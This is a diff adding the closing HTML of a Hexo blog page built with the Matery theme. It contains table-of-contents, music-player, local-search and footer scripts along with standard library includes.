+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="../../../../../../../libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="../../../../../../../libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="7788095093"
+                   fixed='true'
+                   autoplay='true'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="../../../../../../../libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2022-2023</span>
+            
+            <span id="year">2022</span>
+            <a href="../../../../../../../about" target="_blank">fantasycat6</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">312.9k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/fantasycat6" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1745272762@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1745272762" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1745272762" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="../../../../../../../atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('../../../../../../../search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="../../../../../../../libs/materialize/materialize.min.js"></script>
+    <script src="../../../../../../../libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="../../../../../../../libs/aos/aos.js"></script>
+    <script src="../../../../../../../libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="../../../../../../../libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="../../../../../../../js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="../../../../../../../libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="../../../../../../../libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+	
+    
+
+    
+
+    
+
+    
+    <script src="../../../../../../../libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
